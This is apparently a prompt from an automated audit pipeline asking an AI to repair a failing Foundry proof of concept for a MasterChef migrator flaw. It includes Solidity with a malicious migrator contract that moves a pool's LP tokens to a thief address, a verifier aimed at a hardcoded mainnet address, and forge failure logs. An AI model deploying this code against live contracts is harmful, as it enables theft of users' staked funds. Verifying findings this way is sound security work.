You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: MasterChef migrator can replace real LP collateral with worthless tokens and steal all staked funds
- claim: `setMigrator()` lets the owner install an arbitrary migrator, and `migrate()` then approves that migrator for the pool's entire LP balance before only checking that the replacement token reports the same `balanceOf(address(this))`. A malicious migrator can pull out the real LP tokens, mint or otherwise return a fake token that reports the same balance, and permanently swap the pool to the worthless replacement.
- impact: All LP tokens in a migrated pool can be stolen, while users are left with accounting claims on fake LP tokens when they later withdraw.
- exploit_paths: ["Owner sets a malicious migrator with `setMigrator()`", "Anyone calls `migrate(pid)`", "MasterChef approves the migrator for the pool's full LP balance", "Migrator transfers out the genuine LP tokens and returns a fake token with a spoofed/minted matching balance", "MasterChef updates `pool.lpToken`, so future withdrawals return the fake asset instead of the original collateral"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IMasterChefLike {
    function owner() external view returns (address);
    function migrator() external view returns (address);
    function setMigrator(address migrator_) external;
    function poolLength() external view returns (uint256);
    function poolInfo(uint256 pid)
        external
        view
        returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
    function migrate(uint256 pid) external;
    function withdraw(uint256 pid, uint256 amount) external;
}

interface ISushiMakerLike {
    function owner() external view returns (address);
    function factory() external view returns (address);
}

contract MaliciousMigratorScaffold {
    address public thief;
    address public replacementToken;

    constructor() {}

    function configure(address thief_, address replacementToken_) external {
        thief = thief_;
        replacementToken = replacementToken_;
    }

    function migrate(IERC20Like realLpToken) external returns (IERC20Like) {
        uint256 approvedBalance = realLpToken.balanceOf(msg.sender);
        if (approvedBalance != 0 && thief != address(0)) {
            realLpToken.transferFrom(msg.sender, thief, approvedBalance);
        }

        return IERC20Like(replacementToken);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    bool public checkedTarget;
    bool public targetHasCode;
    bool public targetExposesMigratorFlow;
    bool public ownerStageReachable;
    address public observedOwner;
    uint256 public observedPoolLength;
    address public observedMigrator;
    address public observedPoolLpToken;
    uint256 public observedTargetLpBalance;
    uint256 public observedPid;
    address public stagedMaliciousMigrator;
    string public exploitPathUsed;
    string public infeasibilityReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        checkedTarget = true;
        _profitToken = WETH;
        targetHasCode = TARGET.code.length != 0;
        if (!targetHasCode) {
            infeasibilityReason = "target address has no code at the fork";
            return;
        }

        observedOwner = _readOwner(TARGET);

        (bool hasMigrator, address migrator_) =
            _tryReadAddress(TARGET, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
        if (hasMigrator) {
            observedMigrator = migrator_;
        }

        (bool hasPoolLength, uint256 poolLength_) =
            _tryReadUint(TARGET, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));
        if (hasPoolLength) {
            observedPoolLength = poolLength_;
        }

        targetExposesMigratorFlow = hasMigrator && hasPoolLength;

        exploitPathUsed =
            "owner sets malicious migrator -> anyone calls migrate(pid) -> MasterChef approves full LP balance -> migrator steals genuine LP and returns replacement -> pool.lpToken changes so later withdraw returns fake asset";

        if (!targetExposesMigratorFlow) {
            infeasibilityReason =
                "supplied target does not expose the MasterChef migrate(pid)/pool.lpToken/withdraw flow on this fork";
            return;
        }

        _snapshotPoolState(TARGET);

        if (observedOwner != address(this)) {
            infeasibilityReason = "blocked at stage 1: setMigrator() is onlyOwner and verifier is not the target owner";
            return;
        }

        ownerStageReachable = true;

        stagedMaliciousMigrator = address(new MaliciousMigratorScaffold());

        // Capital is not the limiting factor for this finding: once the owner sets a malicious migrator,
        // the theft comes from MasterChef approving its entire LP balance to the migrator. A v2 flashswap
        // funding leg is therefore unnecessary here and is intentionally omitted.
        IMasterChefLike chef = IMasterChefLike(TARGET);
        chef.setMigrator(stagedMaliciousMigrator);

        // The remaining exploit stages require a pre-existing on-chain replacement token that can report the
        // same balanceOf(address(this)) after migrate(pid). Under the anti-cheat rules we may not deploy a fake
        // ERC20, so we stop before calling migrate(pid) unless such a token is already identified in context.
        //
        // If such a replacement were available, the path would be:
        // 1) anyone calls migrate(pid);
        // 2) MasterChef approves the migrator for the pool's full LP balance;
        // 3) the migrator transfers out the real LP collateral and returns the replacement token;
        // 4) MasterChef assigns pool.lpToken = newLpToken;
        // 5) later withdraw(pid, amount) sends the fake replacement instead of the original LP asset.
        infeasibilityReason =
            "blocked after setMigrator(): no pre-existing replacement token is identified in the provided on-chain context";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function _snapshotPoolState(address chefAddress) internal {
        uint256 poolLength = observedPoolLength;
        if (poolLength == 0) {
            return;
        }

        uint256 scanLimit = poolLength > 8 ? 8 : poolLength;
        for (uint256 pid = 0; pid < scanLimit; ++pid) {
            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
                if (lpBalance != 0 || observedPoolLpToken == address(0)) {
                    observedPid = pid;
                    observedPoolLpToken = lpToken;
                    observedTargetLpBalance = lpBalance;
                    if (lpBalance != 0) {
                        break;
                    }
                }
            } catch {}
        }
    }

    function _readOwner(address account) internal view returns (address owner_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.owner.selector));
        if (success && data.length >= 32) {
            owner_ = abi.decode(data, (address));
        }
    }

    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, address(0));
        }
        return (true, abi.decode(data, (address)));
    }

    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, 0);
        }
        return (true, abi.decode(data, (uint256)));
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = false;

        checkedTarget = false;
        targetHasCode = false;
        targetExposesMigratorFlow = false;
        ownerStageReachable = false;
        observedOwner = address(0);
        observedPoolLength = 0;
        observedMigrator = address(0);
        observedPoolLpToken = address(0);
        observedTargetLpBalance = 0;
        observedPid = 0;
        stagedMaliciousMigrator = address(0);
        exploitPathUsed = "none";
        infeasibilityReason = "";
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!success || data.length < 32) {
            return 0;
        }

        balance = abi.decode(data, (uint256));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.81s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 394472)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [394472] FlawVerifierTest::testExploit()
    ├─ [2367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [354463] FlawVerifier::executeOnOpportunity()
    │   ├─ [2382] 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50::owner() [staticcall]
    │   │   └─ ← [Return] 0x19B3Eb3Af5D93b77a5619b047De0EED7115A19e7
    │   ├─ [204] 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50::migrator() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [172] 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50::poolLength() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 11720049 [1.172e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50.poolLength
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 912.29ms (656.34ms CPU time)

Ran 1 test suite in 990.35ms (912.29ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 394472)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
